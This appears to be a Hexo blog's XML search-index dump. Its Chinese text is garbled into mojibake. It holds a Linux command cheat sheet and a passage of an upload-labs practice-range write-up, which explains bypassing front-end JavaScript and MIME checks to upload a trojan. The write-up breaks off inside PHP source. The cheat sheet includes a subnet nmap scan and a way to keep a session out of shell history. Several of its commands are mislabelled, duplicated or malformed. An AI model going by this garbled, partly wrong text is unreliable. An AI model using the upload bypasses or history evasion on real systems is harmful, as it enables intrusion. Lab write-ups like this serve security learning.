test.txt</span><br></pre></td></tr></table></figure><p><strong>åˆ›å»ºç©ºæ–‡ä»¶æˆ–æ¸…ç©ºä¸€ä¸ªç°æœ‰æ–‡ä»¶ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&gt; test.txt</span><br></pre></td></tr></table></figure><p><strong>ä¸Ubuntu NTP serveråŒæ­¥æ—¶é—´ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntpdate ntp.ubuntu.com</span><br></pre></td></tr></table></figure><p><strong>ç”¨netstatæ˜¾ç¤ºæ‰€æœ‰tcp4ç›‘å¬ç«¯å£ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -lnt4 | awk &#x27;&#123;print $4&#125;&#x27; | cut -f2 -d: | grep -o &#x27;[0-9]*&#x27;</span><br></pre></td></tr></table></figure><p><strong>qcow2é•œåƒæ–‡ä»¶è½¬æ¢ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-img convert -f qcow2 -O raw precise-server-cloudimg-amd64-disk1.img \precise-server-cloudimg-amd64-disk1.raw</span><br></pre></td></tr></table></figure><p><strong>é‡å¤è¿è¡Œæ–‡ä»¶ï¼Œæ˜¾ç¤ºå…¶è¾“å‡ºï¼ˆç¼ºçœæ˜¯2ç§’ä¸€æ¬¡ï¼‰ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">watch ps -ef</span><br></pre></td></tr></table></figure><p><strong>æ‰€æœ‰ç”¨æˆ·åˆ—è¡¨ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getent passwd</span><br></pre></td></tr></table></figure><p><strong>Mount root in read/write mode:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -o remount,rw /</span><br></pre></td></tr></table></figure><p><strong>æŒ‚è½½ä¸€ä¸ªç›®å½•ï¼ˆè¿™æ˜¯ä¸èƒ½ä½¿ç”¨é“¾æ¥çš„æƒ…å†µï¼‰:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount --bind /source /destination</span><br></pre></td></tr></table></figure><p><strong>åŠ¨æ€æ›´æ–°DNS server:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nsupdate &lt; &lt;EOF update add $HOST 86400 A $IP send EOF</span><br></pre></td></tr></table></figure><p><strong>é€’å½’grepæ‰€æœ‰ç›®å½•ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -r &quot;some_text&quot; /path/to/dir</span><br></pre></td></tr></table></figure><p><strong>åˆ—å‡ºå‰10ä¸ªæœ€å¤§çš„æ–‡ä»¶ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof / | awk &#x27;&#123; if($7 &gt; 1048576) print $7/1048576 &quot;MB &quot;$9 &#125;&#x27; | sort -n -u | tail</span><br></pre></td></tr></table></figure><p><strong>æ˜¾ç¤ºå‰©ä½™å†…å­˜(MB):</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free -m | grep cache | awk &#x27;/[0-9]/&#123; print $4&quot; MB&quot; &#125;&#x27;</span><br></pre></td></tr></table></figure><p><strong>æ‰“å¼€Vimå¹¶è·³åˆ°æ–‡ä»¶æœ«ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim + some_file_name</span><br></pre></td></tr></table></figure><p><strong>Git å…‹éš†æŒ‡å®šåˆ†æ”¯(master):</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:name/app.git -b master</span><br></pre></td></tr></table></figure><p><strong>Git åˆ‡æ¢åˆ°å…¶å®ƒåˆ†æ”¯(develop):</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout develop</span><br></pre></td></tr></table></figure><p><strong>Git åˆ é™¤åˆ†æ”¯(myfeature):</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:name/app.git -b master</span><br></pre></td></tr></table></figure><p><strong>Git åˆ‡æ¢åˆ°å…¶å®ƒåˆ†æ”¯(develop):</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout develop</span><br></pre></td></tr></table></figure><p><strong>Git åˆ é™¤åˆ†æ”¯(myfeature):</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -d myfeature</span><br></pre></td></tr></table></figure><p><strong>Git åˆ é™¤è¿œç¨‹åˆ†æ”¯</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push origin :branchName</span><br></pre></td></tr></table></figure><p><strong>Git å°†æ–°åˆ†æ”¯æ¨é€åˆ°è¿œç¨‹æœåŠ¡å™¨ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin mynewfeature</span><br></pre></td></tr></table></figure><p><strong>æ‰“å°å†å²è®°å½•ä¸­æœ€åä¸€æ¬¡catå‘½ä»¤ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!cat:p</span><br></pre></td></tr></table></figure><p><strong>è¿è¡Œå†å²è®°å½•é‡Œæœ€åä¸€æ¬¡catå‘½ä»¤ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!cat</span><br></pre></td></tr></table></figure><p><strong>æ‰¾å‡º/home/userä¸‹æ‰€æœ‰ç©ºå­ç›®å½•:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /home/user -maxdepth 1 -type d -empty</span><br></pre></td></tr></table></figure><p><strong>è·å–test.txtæ–‡ä»¶ä¸­ç¬¬50-60è¡Œå†…å®¹ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt; test.txt sed -n &#x27;50,60p&#x27;</span><br></pre></td></tr></table></figure><p><strong>è¿è¡Œæœ€åä¸€ä¸ªå‘½ä»¤(å¦‚æœæœ€åä¸€ä¸ªå‘½ä»¤æ˜¯mkdir /root/test, ä¸‹é¢å°†ä¼šè¿è¡Œ: sudo mkdir /root/test)ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo !!</span><br></pre></td></tr></table></figure><p><strong>åˆ›å»ºä¸´æ—¶RAMæ–‡ä»¶ç³»ç»Ÿ â€“ ramdisk (å…ˆåˆ›å»º/tmpramç›®å½•):</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t tmpfs tmpfs /tmpram -o size=512m</span><br></pre></td></tr></table></figure><p><strong>Grep whole words:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -w &quot;name&quot; test.txt</span><br></pre></td></tr></table></figure><p><strong>åœ¨éœ€è¦æå‡æƒé™çš„æƒ…å†µä¸‹å¾€ä¸€ä¸ªæ–‡ä»¶é‡Œè¿½åŠ æ–‡æœ¬ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;some text&quot; | sudo tee -a /path/file</span><br></pre></td></tr></table></figure><p><strong>åˆ—å‡ºæ‰€æœ‰kill signalå‚æ•°:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -l</span><br></pre></td></tr></table></figure><p><strong>åœ¨bashå†å²è®°å½•é‡Œç¦æ­¢è®°å½•æœ€åä¸€æ¬¡ä¼šè¯ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -9 $$</span><br></pre></td></tr></table></figure><p><strong>æ‰«æç½‘ç»œå¯»æ‰¾å¼€æ”¾çš„ç«¯å£ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 8081 172.20.0.0/16</span><br></pre></td></tr></table></figure><p><strong>è®¾ç½®git email:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --globaluser.email &quot;me@example.com&quot; </span><br></pre></td></tr></table></figure><p><strong>To sync with master if you have unpublished commits:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull --rebase origin master</span><br></pre></td></tr></table></figure><p><strong>å°†æ‰€æœ‰æ–‡ä»¶åä¸­å«æœ‰â€txtâ€çš„æ–‡ä»¶ç§»å…¥/home/userç›®å½•:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find -iname &quot;*txt*&quot; -exec mv -v &#123;&#125; /home/user \;</span><br></pre></td></tr></table></figure><p><strong>å°†æ–‡ä»¶æŒ‰è¡Œå¹¶åˆ—æ˜¾ç¤ºï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paste test.txt test1.txt</span><br></pre></td></tr></table></figure><p><strong>shellé‡Œçš„è¿›åº¦æ¡:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pv data.log</span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨netcatå°†æ•°æ®å‘é€åˆ°Graphite server:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;hosts.sampleHost 10 `date +%s`&quot; | nc 192.168.200.2 3000</span><br></pre></td></tr></table></figure><p><strong>å°†tabsè½¬æ¢æˆç©ºæ ¼ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expand test.txt &gt; test1.txt</span><br></pre></td></tr></table></figure><p><strong>Skip bash history:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt; space &gt;cmd</span><br></pre></td></tr></table></figure><p><strong>å»ä¹‹å‰çš„å·¥ä½œç›®å½•ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd -</span><br></pre></td></tr></table></figure><p><strong>æ‹†åˆ†å¤§ä½“ç§¯çš„tar.gzæ–‡ä»¶(æ¯ä¸ª100MB)ï¼Œç„¶ååˆå¹¶å›å»ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">split â€“b 100m /path/to/large/archive /path/to/output/files cat files* &gt; archive</span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨curlè·å–HTTP status code:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sL -w &quot;%&#123;http_code&#125;\\n&quot; www.example.com -o /dev/null</span><br></pre></td></tr></table></figure><p><strong>è®¾ç½®rootå¯†ç ï¼Œå¼ºåŒ–MySQLå®‰å…¨å®‰è£…:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/mysql_secure_installation</span><br></pre></td></tr></table></figure><p><strong>å½“Ctrl + cä¸å¥½ä½¿æ—¶:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ctrl + \</span><br></pre></td></tr></table></figure><p><strong>è·å–æ–‡ä»¶owner:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stat -c %U file.txt</span><br></pre></td></tr></table></figure><p><strong>blockè®¾å¤‡åˆ—è¡¨ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsblk -f</span><br></pre></td></tr></table></figure><p><strong>æ‰¾å‡ºæ–‡ä»¶åç»“å°¾æœ‰ç©ºæ ¼çš„æ–‡ä»¶ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -type f -exec egrep -l &quot; +$&quot; &#123;&#125; \;</span><br></pre></td></tr></table></figure><p><strong>æ‰¾å‡ºæ–‡ä»¶åæœ‰tabç¼©è¿›ç¬¦çš„æ–‡ä»¶</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -type f -exec egrep -l $&#x27;\t&#x27; &#123;&#125; \;</span><br></pre></td></tr></table></figure><p><strong>ç”¨â€=â€æ‰“å°å‡ºæ¨ªçº¿:å…¨é€‰å¤åˆ¶æ”¾è¿›ç¬”è®°</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf &#x27;%100s\n&#x27; | tr &#x27; &#x27; =</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> å‘½ä»¤å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labsé¶åœº</title>
      <link href="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/"/>
      <url>/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230602092842788.png" alt="image-20230602092842788"></p><h2 id="pass-01-jséªŒè¯"><a href="#pass-01-jséªŒè¯" class="headerlink" title="pass-01(jséªŒè¯)"></a>pass-01(jséªŒè¯)</h2><p>ä¸Šä¼ æœ¨é©¬å</p><p>æç¤ºï¼šè¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ .jpg|.png|.gifç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š.php</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523232014129.png" alt="image-20230523232014129"></p><p><strong>åˆ†æä¸€ä¸‹ä»£ç </strong></p><p>è¿™é‡Œæˆ‘ä»¬è·³è¿‡å¼¹çª—çš„æç¤ºï¼Œå¯ä»¥çœ‹å‡ºæ¥è¿™ä¸ªéªŒè¯æ˜¯å‰ç«¯è¿›è¡Œçš„ï¼Œ</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523232753987.png" alt="image-20230523232753987"></p><p>ä»æ ‡è®°çš„ä»£ç ä¸­å¯ä»¥çœ‹å‡ºï¼Œä½¿ç”¨äº†onsubmitè¿™ä¸ªå‡½æ•°ï¼Œè§¦å‘äº†æ–‡ä»¶æäº¤äº‹ä»¶ï¼Œåœ¨è¡¨å•æäº¤åé©¬ä¸Šè°ƒç”¨äº†return checkFile è¿™ä¸ªå‡½æ•°å¯¹ä¸Šä¼ è¿›è¡Œäº†æ£€æŸ¥ã€‚</p><p><strong>ç»•è¿‡æ–¹å¼</strong></p><p><strong>ç¬¬ä¸€ç§ï¼šåˆ›å»ºä¸€ä¸ªæ–°çš„htmlæ–‡ä»¶ï¼Œå°†é¡µé¢çš„æºä»£ç å¤åˆ¶ä¸‹æ¥ï¼Œè¿›è¡Œä¿®æ”¹åˆ é™¤æ“ä½œç¦ç”¨æ‰é‡Œé¢çš„jsè„šæœ¬ã€‚</strong></p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523234905931.png" alt="image-20230523234905931"></p><p>æŠŠonsubmitè¿™ä¸ªå‡½æ•°åˆ æ‰ï¼Œ</p><p>æŠŠscriptä»£ç ä¹Ÿåˆ æ‰</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523235125426.png" alt="image-20230523235125426"></p><p> åœ¨formè¡¨å•ä¸­æ·»åŠ ç¬¬ä¸€å…³çš„æäº¤åœ°å€</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523235402326.png" alt="image-20230523235402326"></p><p><strong>ç¬¬äºŒç§ï¼šç›´æ¥æŒ‰F12 æŠŠonsubmitè¿™ä¸ªç›´æ¥åˆ é™¤æ‰</strong></p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523235950881.png" alt="image-20230523235950881"></p><p>ä¸æ¨èç¬¬äºŒç§ï¼Œå› ä¸ºå¦‚æœæ˜¯åœ¨æµè§ˆå™¨æŸ¥çœ‹å™¨ä¸­ç›´æ¥åˆ é™¤çš„è¯ï¼Œå¯èƒ½ä»–è¿˜æœ‰ä¸€äº›æ­£å¸¸çš„jsï¼Œ</p><p>å¦‚æœæŠŠæ­£å¸¸çš„jsç»™åˆ é™¤æ‰çš„è¯ï¼Œå¯èƒ½æ­£å¸¸çš„jsä¼šå½±å“åˆ°ä¸Šä¼ æ“ä½œã€‚</p><h2 id="pass-02-åç«¯éªŒè¯-æ–‡ä»¶ç±»å‹æ ¡éªŒ-MIMEæ ¡éªŒ"><a href="#pass-02-åç«¯éªŒè¯-æ–‡ä»¶ç±»å‹æ ¡éªŒ-MIMEæ ¡éªŒ" class="headerlink" title="pass-02(åç«¯éªŒè¯) æ–‡ä»¶ç±»å‹æ ¡éªŒ (MIMEæ ¡éªŒ)"></a>pass-02(åç«¯éªŒè¯) æ–‡ä»¶ç±»å‹æ ¡éªŒ (MIMEæ ¡éªŒ)</h2><p>ä¸Šä¼ æœ¨é©¬å</p><p>æç¤ºï¼šæœ¬passåœ¨æœåŠ¡ç«¯å¯¹æ•°æ®åŒ…çš„MIMEè¿›è¡Œæ£€æŸ¥ã€‚</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230528133234181.png" alt="image-20230528133234181"></p><p>åˆ†æä»£ç ï¼š</p><p>ä»æºç ä¸­å¯ä»¥çœ‹å‡ºåªå¯¹æ–‡ä»¶ç±»å‹(type) è¿›è¡ŒéªŒè¯ï¼Œå¿…é¡»æ˜¯image/jpegæˆ–è€…image/png æˆ–è€…image/gifçš„æ ¼å¼ï¼Œæ²¡æœ‰å¯¹åç¼€åè¿›è¡ŒéªŒè¯ï¼Œ</p><p>åªéœ€è¦bpæŠ“åŒ…å°†Content-Type:çš„å‚æ•°ä¿®æ”¹æˆimage/jpeg æˆ–è€…image/png æˆ–è€…image/gifå…¶ä¸­çš„ä¸€ç§ï¼Œè¿›è¡Œç»•è¿‡å°±å¥½ã€‚</p><p>æ“ä½œæ­¥éª¤ï¼š</p><p>å¼€å§‹bpæŠ“åŒ…ï¼Œä¿®æ”¹content-typeç±»å‹å³å¯</p><blockquote><p><strong>ç†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯MIMEï¼Ÿ</strong></p><p>MIME:å¤šç”¨é€”äº’è”ç½‘é‚®ä»¶æ‰©å±•åè®®ã€‚ç”¨é€”ä¸ºæ ¹æ®æ–‡ä»¶åç¼€ååˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œç”¨ä»€ä¹ˆåº”ç”¨ç¨‹åºæ‰“å¼€ï¼Œä½†æ˜¯åœ¨è¿™é‡Œæ˜¯æ ¹æ®æ–‡ä»¶ç±»å‹åˆ¤æ–­åç¼€åã€‚</p></blockquote><p>$_FILES[â€˜myfileâ€™][â€˜typeâ€™]æ–‡ä»¶çš„MIMEç±»å‹ï¼Œéœ€è¦æµè§ˆå™¨æä¾›è¯¥ä¿¡æ¯çš„æ”¯æŒï¼Œä¾‹å¦‚â€image/gifâ€</p><p>MIME ç»™å‡ºçš„æ˜¯æ–‡ä»¶çš„MIMEä¿¡æ¯ ï¼Œæ­¤ä¿¡æ¯å¯ä»¥ç”¨æ¥åœ¨HTTP Conten-type å¤´ ä¿¡æ¯ä¸­å‘é€ æ­£ç¡®çš„ä¿¡æ¯ï¼Œå¦‚ï¼šheader(â€œCotent-type:image/gifâ€)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">æ–‡ä»¶æ ¼å¼</span><br><span class="line">ç¼–è¾‘</span><br><span class="line">æ’­æŠ¥</span><br><span class="line">æœ€æ—©çš„HTTPåè®®ä¸­ï¼Œå¹¶æ²¡æœ‰é™„åŠ çš„æ•°æ®ç±»å‹ä¿¡æ¯ï¼Œæ‰€æœ‰ä¼ é€çš„æ•°æ®éƒ½è¢«å®¢æˆ·ç¨‹åºè§£é‡Šä¸ºè¶…æ–‡æœ¬æ ‡è®°è¯­è¨€HTML æ–‡æ¡£ï¼Œè€Œä¸ºäº†æ”¯æŒå¤šåª’ä½“æ•°æ®ç±»å‹ï¼ŒHTTPåè®®ä¸­å°±ä½¿ç”¨äº†é™„åŠ åœ¨æ–‡æ¡£ä¹‹å‰çš„MIMEæ•°æ®ç±»å‹ä¿¡æ¯æ¥æ ‡è¯†æ•°æ®ç±»å‹ã€‚</span><br><span class="line">MIMEæ„ä¸ºå¤šåŠŸèƒ½Interneté‚®ä»¶æ‰©å±•ï¼Œå®ƒè®¾è®¡çš„æœ€åˆç›®çš„æ˜¯ä¸ºäº†åœ¨å‘é€ç”µå­é‚®ä»¶æ—¶é™„åŠ å¤šåª’ä½“æ•°æ®ï¼Œè®©é‚®ä»¶å®¢æˆ·ç¨‹åºèƒ½æ ¹æ®å…¶ç±»å‹è¿›è¡Œå¤„ç†ã€‚ç„¶è€Œå½“å®ƒè¢«HTTPåè®®æ”¯æŒä¹‹åï¼Œå®ƒçš„æ„ä¹‰å°±æ›´ä¸ºæ˜¾è‘—äº†ã€‚å®ƒä½¿å¾—HTTPä¼ è¾“çš„ä¸ä»…æ˜¯æ™®é€šçš„æ–‡æœ¬ï¼Œè€Œå˜å¾—ä¸°å¯Œå¤šå½©ã€‚</span><br><span class="line">æ¯ä¸ªMIMEç±»å‹ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œå‰é¢æ˜¯æ•°æ®çš„å¤§ç±»åˆ«ï¼Œä¾‹å¦‚å£°éŸ³audioã€å›¾è±¡imageç­‰ï¼Œåé¢å®šä¹‰å…·ä½“çš„ç§ç±»ã€‚</span><br><span class="line">ä¸ƒç§å¤§ç±»åˆ«ï¼š</span><br><span class="line">video</span><br><span class="line">image</span><br><span class="line">application</span><br><span class="line">text</span><br><span class="line">audio</span><br><span class="line">multipart</span><br><span class="line">message</span><br><span class="line">å¸¸è§çš„MIMEç±»å‹(é€šç”¨å‹)ï¼š</span><br><span class="line">è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€æ–‡æœ¬ .html text/html</span><br><span class="line">xmlæ–‡æ¡£ .xml text/xml</span><br><span class="line">XHTMLæ–‡æ¡£ .xhtml application/xhtml+xml</span><br><span class="line">æ™®é€šæ–‡æœ¬ .txt text/plain</span><br><span class="line">RTFæ–‡æœ¬ .rtf application/rtf</span><br><span class="line">PDFæ–‡æ¡£ .pdf application/pdf</span><br><span class="line">Microsoft Wordæ–‡ä»¶ .word application/msword</span><br><span class="line">PNGå›¾åƒ .png image/png</span><br><span class="line">GIFå›¾å½¢ .gif image/gif</span><br><span class="line">JPEGå›¾å½¢ .jpeg,.jpg image/jpeg</span><br><span class="line">auå£°éŸ³æ–‡ä»¶ .au audio/basic</span><br><span class="line">MIDIéŸ³ä¹æ–‡ä»¶ mid,.midi audio/midi,audio/x-midi</span><br><span class="line">RealAudioéŸ³ä¹æ–‡ä»¶ .ra, .ram audio/x-pn-realaudio</span><br><span class="line">MPEGæ–‡ä»¶ .mpg,.mpeg video/mpeg</span><br><span class="line">AVIæ–‡ä»¶ .avi video/x-msvideo</span><br><span class="line">GZIPæ–‡ä»¶ .gz application/x-gzip</span><br><span class="line">TARæ–‡ä»¶ .tar application/x-tar</span><br><span class="line">ä»»æ„çš„äºŒè¿›åˆ¶æ•°æ® application/octet-stream</span><br></pre></td></tr></table></figure><p><strong>æ¶‰åŠçš„å‡½æ•°ç”¨æ³•</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">trim():å»é™¤å·¦å³ä¸¤ä¾§çš„ç©ºç™½</span><br><span class="line">deldotï¼ˆï¼‰ï¼šåˆ é™¤æœ«å°¾çš„åº—</span><br><span class="line">strrchar(string,char):å‡½æ•°æŸ¥æ‰¾ä¸²ï¼Œåœ¨stringå­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾ï¼Œcharåœ¨stringå­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œè¿”å›å¹¶ä»è¯¥ä½ç½®æˆªå–åˆ°å°¾ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°å­—ç¬¦ï¼Œåˆ™è¿”å›false</span><br><span class="line">strrchar(&#x27;hello  wordld,i love you &#x27;,&#x27;i&#x27;)</span><br><span class="line">è¾“å‡ºç»“æœï¼š i love you </span><br><span class="line">strtolower():å‡½æ•° æŠŠæ‰€æœ‰å­—ç¬¦ä¸²è£…æ¢æˆå°å†™</span><br><span class="line">str_ireplace(fine,replace,strin):æ›¿æ¢ï¼Œ</span><br><span class="line">åœ¨strinå­—ç¬¦ä¸²ä¸­ï¼Œå»æœç´¢fineå­—ç¬¦ä¸²ï¼Œå¦‚æœ</span><br><span class="line">æœåˆ°åˆ°åŒ¹é…ä¸Šäº†ï¼Œç”¨replaceå­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢</span><br></pre></td></tr></table></figure><h2 id="pass-03-æ–‡ä»¶åç¼€åï¼Œé»‘åå•ç»•è¿‡"><a href="#pass-03-æ–‡ä»¶åç¼€åï¼Œé»‘åå•ç»•è¿‡" class="headerlink" title="pass-03(æ–‡ä»¶åç¼€åï¼Œé»‘åå•ç»•è¿‡)"></a>pass-03(æ–‡ä»¶åç¼€åï¼Œé»‘åå•ç»•è¿‡)</h2><p>ä¸Šä¼ æœ¨é©¬å</p><p>æç¤ºï¼šä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼            </p><p>æŸ¥çœ‹åŸä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;../config.php&#x27;;</span><br><span class="line">include &#x27;../common.php&#x27;;</span><br><span class="line">include &#x27;../head.php&#x27;;</span><br><span class="line">include &#x27;../menu.php&#x27;;</span><br><span 